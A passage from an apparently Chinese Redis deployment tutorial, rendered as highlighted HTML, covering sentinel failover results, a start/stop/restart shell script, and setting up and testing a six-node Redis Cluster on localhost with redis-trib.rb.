operator">=</span>127.0.0.1,port<span class="token operator">=</span>6380,state<span class="token operator">=</span>online,offset<span class="token operator">=</span>254791,lag<span class="token operator">=</span>1  <span class="token comment" spellcheck="true"># 1号从机是 127.0.0.1:6380</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由此可知，当原主机6379下线后，原从机6382被哨兵系统提升为新的主机，而其他的两台从机6380和6381变成新主机6382的从机。此时集群系统变成一主两从。</p><p>现在重新启动6379机器：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-ms/src/           <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis-6379.conf     <span class="token comment" spellcheck="true"># 启动Redis机器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再登陆新主机127.0.0.1:6382查看主从信息：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-ms/src/             <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -h 127.0.0.1 -p 6382        <span class="token comment" spellcheck="true"># 连接到Redis主机</span>127.0.0.1:6382<span class="token operator">></span> info replication        <span class="token comment" spellcheck="true"># 查看主从信息</span><span class="token comment" spellcheck="true"># 返回主从信息</span>role:masterconnected_slaves:3      <span class="token comment" spellcheck="true"># 这台主机下变成有3台从机</span>slave0:ip<span class="token operator">=</span>127.0.0.1,port<span class="token operator">=</span>6381,state<span class="token operator">=</span>online,offset<span class="token operator">=</span>254791,lag<span class="token operator">=</span>1  <span class="token comment" spellcheck="true"># 0号从机是 127.0.0.1:6381</span>slave1:ip<span class="token operator">=</span>127.0.0.1,port<span class="token operator">=</span>6380,state<span class="token operator">=</span>online,offset<span class="token operator">=</span>254791,lag<span class="token operator">=</span>1  <span class="token comment" spellcheck="true"># 1号从机是 127.0.0.1:6380</span>slave2:ip<span class="token operator">=</span>127.0.0.1,port<span class="token operator">=</span>6379,state<span class="token operator">=</span>online,offset<span class="token operator">=</span>365581,lag<span class="token operator">=</span>1  <span class="token comment" spellcheck="true"># 新挂接的2号从机是 127.0.0.1:6379</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由此可知，当6379机器重新上线后，并不会恢复原主机的身份，而是被哨兵系统挂接到新主机6382下，成为其从机。此时集群系统重新变成一主三从。</p><p><font color="red"><strong>至此Redis哨兵模式部署完成。</strong></font></p><p>为了开始下一阶段部署，现在先停止前面部署的所有Redis进程：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">pkill</span> redis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-4-附：哨兵模式一键启动-停止-重启脚本"><a href="#6-4-附：哨兵模式一键启动-停止-重启脚本" class="headerlink" title="6.4. 附：哨兵模式一键启动/停止/重启脚本"></a>6.4. 附：哨兵模式一键启动/停止/重启脚本</h3><blockquote><p>● 脚本下载：<a href="https://share.weiyun.com/5hLLA40">https://share.weiyun.com/5hLLA40</a> 密码：qiwc5g ●</p></blockquote><p>此脚本是根据上文的部署方式和位置编写的，<font color="red">仅适用于Redis节点均在同一台机器的场景</font>。</p><p>若要移植到其他地方使用，需要根据实际情况修改。</p><p>脚本内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true"># 根据主从/哨兵模式的部署目录对应修改</span><span class="token function">cd</span> /usr/local/redis-ms/src/<span class="token comment" spellcheck="true"># 启动函数</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  ./redis-server <span class="token punctuation">..</span>/redis-6379.conf  <span class="token operator">&amp;</span>  ./redis-server <span class="token punctuation">..</span>/redis-6380.conf  <span class="token operator">&amp;</span>  ./redis-server <span class="token punctuation">..</span>/redis-6381.conf  <span class="token operator">&amp;</span>  ./redis-server <span class="token punctuation">..</span>/redis-6382.conf  <span class="token operator">&amp;</span>  ./redis-sentinel <span class="token punctuation">..</span>/sentinel-26380.conf  <span class="token operator">&amp;</span>  ./redis-sentinel <span class="token punctuation">..</span>/sentinel-26381.conf  <span class="token operator">&amp;</span>  ./redis-sentinel <span class="token punctuation">..</span>/sentinel-26382.conf  <span class="token operator">&amp;</span>  <span class="token keyword">echo</span> <span class="token string">"all running"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 停止函数</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"redis"</span> <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token string">"grep"</span> <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span><span class="token operator">|</span> <span class="token keyword">while</span> <span class="token function">read</span> pid  <span class="token keyword">do</span>    C_PID<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> --no-heading $pid <span class="token operator">|</span> <span class="token function">wc</span> -l<span class="token variable">)</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$C_PID</span> <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token function">kill</span> -9 <span class="token variable">$pid</span>        <span class="token keyword">echo</span> <span class="token string">"PID=<span class="token variable">$pid</span> is dead"</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token string">"PID=<span class="token variable">$pid</span> not exists"</span>    <span class="token keyword">fi</span> <span class="token keyword">done</span> <span class="token keyword">echo</span> <span class="token string">"all dead"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 脚本入口参数 start|stop|restart</span><span class="token keyword">case</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token keyword">in</span>start<span class="token punctuation">)</span>start<span class="token punctuation">;</span><span class="token punctuation">;</span>stop<span class="token punctuation">)</span>stop<span class="token punctuation">;</span><span class="token punctuation">;</span>restart<span class="token punctuation">)</span>stopstart<span class="token punctuation">;</span><span class="token punctuation">;</span>*<span class="token punctuation">)</span><span class="token function">printf</span> <span class="token string">'Usage: %s {start|stop|restart}\n'</span><span class="token string">"<span class="token variable">$prog</span>"</span><span class="token keyword">exit</span> 1<span class="token punctuation">;</span><span class="token punctuation">;</span>esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是shell脚本，保存为<code>redis-mss.sh</code>（文件名任意）即可执行（若无法执行可能是换行符非Linux格式的问题，可尝试通过<code>dos2unix</code>命令修正换行符）。</p><p>使用方式如下：</p><pre class="line-numbers language-bash"><code class="language-bash">sh redis-mss.sh start    <span class="token comment" spellcheck="true"># 启动</span>sh redis-mss.sh stop     <span class="token comment" spellcheck="true"># 停止</span>sh redis-mss.sh restart  <span class="token comment" spellcheck="true"># 重启</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="7-集群模式"><a href="#7-集群模式" class="headerlink" title="7. 集群模式"></a>7. 集群模式</h2><h3 id="7-1-简介"><a href="#7-1-简介" class="headerlink" title="7.1. 简介"></a>7.1. 简介</h3><p>Redis在<strong>3.0版本后</strong>开始支持<strong>集群模式（Redis Cluster）</strong>，目前<em>官方一直都在维护中，具有代表性，建议优先使用</em>。</p><p>Redis Cluster是一种服务器Sharding技术，只要将查询请求发送到Redis Cluster中的任意节点，接收到请求的节点会就将查询请求发送到正确的节点上执行：</p><p>当Redis客户端操作的key恰好在所查询的Redis节点上时，就像操作Redis单例一样。</p><p>当客户端操作的key没有分配到所查询的Redis节点上时，Redis会返回转向指令，指向正确的Redis节点，这<strong>类似于浏览器页面的302 重定向跳转</strong>。</p><p>Redis Cluster并没有使用一致性Hash，而是采用slot（槽）的概念，一共分成16384个槽。Redis Cluster要保证16384个槽对应的Redis节点都正常工作，否则一旦某个Redis节点发生故障，那它负责的slots也就失效，整个集群将不能工作。</p><p>为了增加集群的高可用性，官方推荐的方案是将Redis节点配置成主从结构，即一个主节点，挂N个从节点。这时，如果主节点失效，Redis Cluster会根据选举算法在从节点中选择一个上升为主节点，整个集群继续对外提供服务。</p><p>Redis Cluster的架构模式如下图：</p><p><img src="./03.png"></p><p>上图描述的是六个redis实例构成的集群（<strong>三主三从</strong>），其中：</p><ul><li>6379端口为客户端通讯端口</li><li>16379端口为集群总线端口</li><li>集群内部划分为16384个数据分槽，分布在三个主节点中</li><li>从节点没有分槽，不会参与集群投票，也不会提供数据读取服务，仅作为主节点的备份</li><li>三个主节点中平均分布着16384数据分槽的三分之一，每个节点中不会存在重复数据，仅仅使用自己的从机帮忙冗余</li></ul><p>Redis Cluster具有以下<strong>优点</strong>：</p><ul><li>无中心架构，支持动态扩容，对业务透明</li><li>具备Sentinel的监控和自动故障迁移能力</li><li>高性能，客户端直连Redis服务，免去了Proxy代理的损耗</li><li><del>客户端不需要连接集群所有节点，连接集群中任何一个可用节点即可</del>（实际上是必须连接整个集群的，避免单点故障导致客户端不可用）</li></ul><p>Redis Cluster同时也具有以下<strong>缺点</strong>：</p><ul><li>部署和运维复杂</li><li>数据迁移需要人工干预</li><li>只能使用0号数据库</li><li>不支持批量操作</li><li>分布式逻辑和存储模块耦合</li></ul><h3 id="7-2-部署"><a href="#7-2-部署" class="headerlink" title="7.2. 部署"></a>7.2. 部署</h3><p>下面演示如何部署<strong>集群模式</strong>。</p><p>官方推荐<strong>Redis Cluster</strong>至少需要六个节点，即<strong>三主三从</strong>。</p><p>这里准备六个Redis节点，同时为了区分主从/哨兵模式的部署位置，顺便拷贝一下Redis集群节点的目录（以节点端口号区分）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /usr/local/redis-cluster                                          <span class="token comment" spellcheck="true"># 创建Redis集群目录</span><span class="token function">cp</span> /usr/local/redis-4.0.10/src/redis-trib.rb /usr/local/redis-cluster/  <span class="token comment" spellcheck="true"># 集群构建脚本</span><span class="token function">cp</span> -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6390       <span class="token comment" spellcheck="true"># Redis集群节点目录</span><span class="token function">cp</span> -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6391       <span class="token comment" spellcheck="true"># Redis集群节点目录</span><span class="token function">cp</span> -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6392       <span class="token comment" spellcheck="true"># Redis集群节点目录</span><span class="token function">cp</span> -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6393       <span class="token comment" spellcheck="true"># Redis集群节点目录</span><span class="token function">cp</span> -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6394       <span class="token comment" spellcheck="true"># Redis集群节点目录</span><span class="token function">cp</span> -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6395       <span class="token comment" spellcheck="true"># Redis集群节点目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>下文会基于<code>/usr/local/redis-cluster/redis-xxxx</code>目录部署集群模式。</p></blockquote><p>然后配置这六个Redis节点的配置文件，其配置基本相同（<strong>主从无需配置，在后面初次构建集群时会自动分配；尔后若添加新节点，可人工指定是主节点还是从节点</strong>）：</p><table><thead><tr><th align="center">角色</th><th align="center">配置文件</th><th align="center">服务端口</th></tr></thead><tbody><tr><td align="center">集群节点</td><td align="center">/usr/local/redis-cluster/<strong>redis-6390</strong>/redis.conf</td><td align="center">6390</td></tr><tr><td align="center">集群节点</td><td align="center">/usr/local/redis-cluster/<strong>redis-6391</strong>/redis.conf</td><td align="center">6391</td></tr><tr><td align="center">集群节点</td><td align="center">/usr/local/redis-cluster/<strong>redis-6392</strong>/redis.conf</td><td align="center">6392</td></tr><tr><td align="center">集群节点</td><td align="center">/usr/local/redis-cluster/<strong>redis-6393</strong>/redis.conf</td><td align="center">6393</td></tr><tr><td align="center">集群节点</td><td align="center">/usr/local/redis-cluster/<strong>redis-6394</strong>/redis.conf</td><td align="center">6394</td></tr><tr><td align="center">集群节点</td><td align="center">/usr/local/redis-cluster/<strong>redis-6395</strong>/redis.conf</td><td align="center">6395</td></tr></tbody></table><p>配置文件<code>/usr/local/redis-cluster/redis-639x/redis.conf</code>的内容如下（仅端口号不同）：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1             <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 639xdaemonize <span class="token function">yes</span>pidfile /var/run/redis_639x.pid<span class="token function">dir</span> /tmp/redis-cluster      <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响</span>logfile <span class="token string">"639x.log"</span>          <span class="token comment" spellcheck="true"># Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称</span>dbfilename dump-639x.rdb    <span class="token comment" spellcheck="true"># Redis数据持久化时的存储位置，正式部署请设置为合适的名称</span>cluster-enabled <span class="token function">yes</span>                  <span class="token comment" spellcheck="true"># 启用集群模式</span>cluster-config-file nodes-639x.conf  <span class="token comment" spellcheck="true"># 集群节点的配置文件，由集群创建，但若同一台主机上的名称需唯一</span>cluster-node-timeout 15000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 集群模式配置redis-639x.conf下载：链接：<a href="https://share.weiyun.com/5YJ5V6S">https://share.weiyun.com/5YJ5V6S</a> 密码：2fha9v ●</p></blockquote><p>新建上面配置的Redis集群工作目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /tmp/redis-cluster<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用redis-server命令启动六个Redis节点：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-cluster/redis-6390/src/   <span class="token comment" spellcheck="true"># 切换到Redis-6390节点的启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis.conf                  <span class="token comment" spellcheck="true"># 启动Redis节点</span><span class="token function">cd</span> /usr/local/redis-cluster/redis-6391/src/   <span class="token comment" spellcheck="true"># 切换到Redis-6391节点的启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis.conf                  <span class="token comment" spellcheck="true"># 启动Redis节点</span><span class="token function">cd</span> /usr/local/redis-cluster/redis-6392/src/   <span class="token comment" spellcheck="true"># 切换到Redis-6392节点的启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis.conf                  <span class="token comment" spellcheck="true"># 启动Redis节点</span><span class="token function">cd</span> /usr/local/redis-cluster/redis-6393/src/   <span class="token comment" spellcheck="true"># 切换到Redis-6393节点的启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis.conf                  <span class="token comment" spellcheck="true"># 启动Redis节点</span><span class="token function">cd</span> /usr/local/redis-cluster/redis-6394/src/   <span class="token comment" spellcheck="true"># 切换到Redis-6394节点的启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis.conf                  <span class="token comment" spellcheck="true"># 启动Redis节点</span><span class="token function">cd</span> /usr/local/redis-cluster/redis-6395/src/   <span class="token comment" spellcheck="true"># 切换到Redis-6395节点的启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis.conf                  <span class="token comment" spellcheck="true"># 启动Redis节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先通过<code>ps -ef|grep redis</code>命令可查看六个节点进程是否正常启动：</p><blockquote><p>root      20305      1  0 01:41 ?        00:00:00 ./redis-server 127.0.0.1:6390 [cluster]<br>root      20320      1  0 01:43 ?        00:00:00 ./redis-server 127.0.0.1:6391 [cluster]<br>root      20325      1  0 01:43 ?        00:00:00 ./redis-server 127.0.0.1:6392 [cluster]<br>root      20330      1  0 01:43 ?        00:00:00 ./redis-server 127.0.0.1:6393 [cluster]<br>root      20335      1  0 01:43 ?        00:00:00 ./redis-server 127.0.0.1:6394 [cluster]<br>root      20340      1  0 01:43 ?        00:00:00 ./redis-server 127.0.0.1:6395 [cluster]</p></blockquote><p>然后使用Redis官方提供的工具redis-trib.rb（<font color="red">注意：这个是ruby脚本，需要安装相关支持库，否则无法运行</font>）把这6个节点组建成集群（<font color="red">注意：若集群节点分布在多台不同的机器上，只需其中一个机器执行这条命令即可，但要包含所有机器的集群节点</font>）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-cluster/         <span class="token comment" spellcheck="true"># 切换到集群构建脚本目录</span>./redis-trib.rb create --replicas 1 127.0.0.1:6390 127.0.0.1:6391 127.0.0.1:6392 127.0.0.1:6393 127.0.0.1:6394 127.0.0.1:6395<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>若以后机器IP发生变更，需要重新执行此命令重建集群（重建集群需要先停止集群中所有节点进程，然后删除原集群中所有节点的node.conf文件，最后按照上文步骤构建集群即可）。</p></blockquote><p>此时Redis会返回正在构建的集群信息，返回的信息<strong>大概意思</strong>是“正在把slots槽位分配到6个节点的集群，其中6390、6391、6392是主节点，6394是6390的从节点，6395是6391的从节点，6393是6392的从节点”。</p><p><strong>这里的主从分配是自动的</strong>，若确认无误则输入yes：</p><blockquote><p>&gt;&gt;&gt; Creating cluster<br>&gt;&gt;&gt; Performing hash slots allocation on <font color="red">6 nodes</font>…<br>Using 3 masters:　　　　　<font color="green"># 三主</font><br><font color="red">127.0.0.1:6390<br>127.0.0.1:6391<br>127.0.0.1:6392</font><br><font color="blue">Adding replica 127.0.0.1:6394 to 127.0.0.1:6390</font>　　　　<font color="green"># 三从</font><br><font color="blue">Adding replica 127.0.0.1:6395 to 127.0.0.1:6391<br>Adding replica 127.0.0.1:6393 to 127.0.0.1:6392</font><br>&gt;&gt;&gt; Trying to optimize slaves allocation for anti-affinity<br>[WARNING] Some slaves are in the same host as their master<br>M: ac2520bab97d151897afb5e6f3ca60a673010227 127.0.0.1:6390<br>   slots:0-5460 (5461 slots) master<br>M: 3768ff79e3e58a0ee9c1fef1ab04e7e395196fa8 127.0.0.1:6391<br>   slots:5461-10922 (5462 slots) master<br>M: ac19a87740dc0f0559f10cd1eae617cfcd51b04a 127.0.0.1:6392<br>   slots:10923-16383 (5461 slots) master<br>S: d93d05facb7db5c223d0959a0e58d232334057e4 127.0.0.1:6393<br>   replicates 3768ff79e3e58a0ee9c1fef1ab04e7e395196fa8<br>S: 69546e0a773b6548a37c5d55329eac575c5d7cca 127.0.0.1:6394<br>   replicates ac19a87740dc0f0559f10cd1eae617cfcd51b04a<br>S: ab7405fc14dbc4e883644bccc6d8602992780b44 127.0.0.1:6395<br>   replicates ac2520bab97d151897afb5e6f3ca60a673010227<br><font color="red">Can I set the above configuration? (type "yes" to accept):</font> yes　　　　<font color="green"># 若确认无误则输入yes</font></p></blockquote><p>若构建集群成功，则会返回集群内这6个节点的信息：</p><blockquote><p>&gt;&gt;&gt; Nodes configuration updated<br>&gt;&gt;&gt; Assign a different config epoch to each node<br>&gt;&gt;&gt; Sending CLUSTER MEET messages to join the cluster<br>Waiting for the cluster to join….<br>&gt;&gt;&gt; Performing Cluster Check (using node 127.0.0.1:6390)<br>M: ac2520bab97d151897afb5e6f3ca60a673010227 127.0.0.1:6390<br>   slots:0-5460 (5461 slots) master<br>   1 additional replica(s)<br>M: 3768ff79e3e58a0ee9c1fef1ab04e7e395196fa8 127.0.0.1:6391<br>   slots:5461-10922 (5462 slots) master<br>   1 additional replica(s)<br>S: 69546e0a773b6548a37c5d55329eac575c5d7cca 127.0.0.1:6394<br>   slots: (0 slots) slave<br>   replicates ac19a87740dc0f0559f10cd1eae617cfcd51b04a<br>M: ac19a87740dc0f0559f10cd1eae617cfcd51b04a 127.0.0.1:6392<br>   slots:10923-16383 (5461 slots) master<br>   1 additional replica(s)<br>S: ab7405fc14dbc4e883644bccc6d8602992780b44 127.0.0.1:6395<br>   slots: (0 slots) slave<br>   replicates ac2520bab97d151897afb5e6f3ca60a673010227<br>S: d93d05facb7db5c223d0959a0e58d232334057e4 127.0.0.1:6393<br>   slots: (0 slots) slave<br>   replicates 3768ff79e3e58a0ee9c1fef1ab04e7e395196fa8<br>[OK] All nodes agree about slots configuration.<br>&gt;&gt;&gt; Check for open slots…<br>&gt;&gt;&gt; Check slots coverage…<br><font color="red">[OK] All 16384 slots covered.</font></p></blockquote><h3 id="7-3-测试"><a href="#7-3-测试" class="headerlink" title="7.3. 测试"></a>7.3. 测试</h3><p>现在测试Redis Cluster是否能正常工作。</p><p>通过Redis测试客户端命令<code>redis-cli</code>连接到集群任意一个节点：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-4.0.10/src/           <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -c -h 127.0.0.1 -p 6390       <span class="token comment" spellcheck="true"># 以集群方式连接到Redis-6390节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里需要注意，与前面单机/主从/哨兵模式不同的是，客户端命令<code>redis-cli</code>需要增加一个<code>-c</code>参数，表示是连接到集群，这样客户端的读写行为才是在整个集群中可见的。</p><p>若不加<code>-c</code>参数虽然也可连接，但是仅仅是连接到当前的节点，是无法进行数据读写的（除非所读写的数据的键值，经过Hash计算得到的slot槽号，刚好在这个节点里面）。</p><p>现在在6390节点执行get命令，获取键名为site的数据：</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6390<span class="token operator">></span> get site<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true"># 由于是新部署的Redis集群，该键值必定不存在</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后在6390节点<strong>写入数据</strong>（执行set命令，为键site设置数据）：</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6390<span class="token operator">></span> <span class="token keyword">set</span> site http://exp-blog.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再通过Redis测试客户端命令<code>redis-cli</code>连接到集群另一个节点：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-4.0.10/src/           <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -c -h 127.0.0.1 -p 6395       <span class="token comment" spellcheck="true"># 以集群方式连接到Redis-6395节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在6395节点执行get命令，获取键名为site的数据（经过集群节点转发请求，可以取到数据）：</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6395<span class="token operator">></span> get site<span class="token string">"http://exp-blog.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>现在尝试一下<strong>不以集群方式连接</strong>到节点6395，会发生什么：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-4.0.10/src/               <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -h 127.0.0.1 -p 6395              <span class="token comment" spellcheck="true"># 以单点方式连接到Redis-6395节点（无-c参数）</span>127.0.0.1:6395<span class="token operator">></span> get site                      <span class="token comment" spellcheck="true"># 获取键值为site的数据</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> MOVED 9421 127.0.0.1:6392             <span class="token comment" spellcheck="true"># 报错：该数据在6392节点的9421槽位</span>127.0.0.1:6395<span class="token operator">></span> <span class="token keyword">set</span> site http://exp-blog.com  <span class="token comment" spellcheck="true"># 设置键为site的值</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> MOVED 9421 127.0.0.1:6392             <span class="token comment" spellcheck="true"># 报错：该键应该设置到6392节点的9421槽位</span><span class="token comment" spellcheck="true"># 有些版本的报错信息是这样的，意思是相同的：</span><span class="token comment" spellcheck="true"># -> Redirected to slot [9421] located at 127.0.0.1:6392</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之所以会发生这种情况，其实最开始的Redis Cluster架构介绍的时候就已经解释了原因了：</p><p>Redis Cluster没有使用一致性Hash，而是采用slot（槽）的概念，一共分成16384个槽。在构建集群时，这些槽会不重复地平均被分配到集群中的主节点。</p><p>在读写数据时，Redis Cluster会先计算该数据的键值的slot号，然后再把读写请求分配到该slot号所属的Redis节点。</p><p>而当不以集群方式连接到集群节点时，在计算slot号后，读写请求的分配工作却无法执行，就会出现上述报错。</p><h3 id="7-4-集群的关闭-重启"><a href="#7-4-集群的关闭-重启" class="headerlink" title="7.4. 集群的关闭/重启"></a>7.4. 集群的关闭/重启</h3><p>Redis Cluster的官方文档并没有提供整个集群的关闭与重启的方法。推测可能是由于集群所有节点同时挂掉的可能性不高，毕竟即使偶尔集群中某个节点挂掉了，待其重启后又会自动重新加入集群，并不会带来太大影响。</p><p>但是可能性不高并不代表不会发生，如何关闭/重启整个集群的方式还是需要知道的。</p><p><strong>集群的关闭</strong>，执行这个命令即可（如果是部署到多台IP机器，需要登陆到每一台机器执行）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">pkill</span> redis        <span class="token comment" spellcheck="true"># 是的，直接杀掉集群的全部节点进程就可以了</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>集群的重启</strong>，只需要重新启动原集群中每一个节点就可以了，集群会自动恢复到关闭之前的状态（前提是不能删除node-*.conf、*.aof、*.rdb文件，否则会造成集群数据丢失）。</p><p><font color="red"><strong>至此Redis Cluster集群模式部署完成。</strong></font></p><h3 id="7-5-附：集群模式一键启动-停止-重启脚本"><a href="#7-5-附：集群模式一键启动-停止-重启脚本" class="headerlink" title="7.5. 附：集群模式一键启动/停止/重启脚本"></a>7.5. 附：集群模式一键启动/停止/重启脚本</h3><blockquote><p>● 脚本下载：<a href="https://share.weiyun.com/5Q9lCkE">https://share.weiyun.com/5Q9lCkE</a> 密码：aby4vq ●</p></blockquote><p>此脚本是根据上文的部署方式和位置编写的，<font color="red">仅适用于Redis节点均在同一台机器的场景</font>。</p><p>若要移植到其他地方使用，需要根据实际情况修改。</p><p>脚本内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true"># 根据主从/哨兵模式的部署目录对应修改</span><span class="token function">export</span> cluster_path<span class="token operator">=</span>/usr/local/redis-cluster<span class="token comment" spellcheck="true"># 启动函数</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">${cluster_path}</span>/redis-6390/src/redis-server <span class="token variable">${cluster_path}</span>/redis-6390/redis.conf  <span class="token operator">&amp;</span>  <span class="token variable">${cluster_path}</span>/redis-6391/src/redis-server <span class="token variable">${cluster_path}</span>/redis-6391/redis.conf  <span class="token operator">&amp;</span>  <span class="token variable">${cluster_path}</span>/redis-6392/src/redis-server <span class="token variable">${cluster_path}</span>/redis-6392/redis.conf  <span class="token operator">&amp;</span>  <span class="token variable">${cluster_path}</span>/redis-6393/src/redis-server <span class="token variable">${cluster_path}</span>/redis-6393/redis.conf  <span class="token operator">&amp;</span>  <span class="token variable">${cluster_path}</span>/redis-6394/src/redis-server <span class="token variable">${cluster_path}</span>/redis-6394/redis.conf  <span class="token operator">&amp;</span>  <span class="token variable">${cluster_path}</span>/redis-6395/src/redis-server <span class="token variable">${cluster_path}</span>/redis-6395/redis.conf  <span class="token operator">&amp;</span>  <span class="token keyword">echo</span> <span class="token string">"all running"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 停止函数</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"redis"</span> <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token string">"grep"</span> <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span><span class="token operator">|</span> <span class="token keyword">while</span> <span class="token function">read</span> pid  <span class="token keyword">do</span>    C_PID<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> --no-heading $pid <span class="token operator">|</span> <span class="token function">wc</span> -l<span class="token variable">)</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$C_PID</span> <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token function">kill</span> -9 <span class="token variable">$pid</span>        <span class="token keyword">echo</span> <span class="token string">"PID=<span class="token variable">$pid</span> is dead"</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token string">"PID=<span class="token variable">$pid</span> not exists"</span>    <span class="token keyword">fi</span> <span class="token keyword">done</span> <span class="token keyword">echo</span> <span class="token string">"all dead"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 脚本入口参数 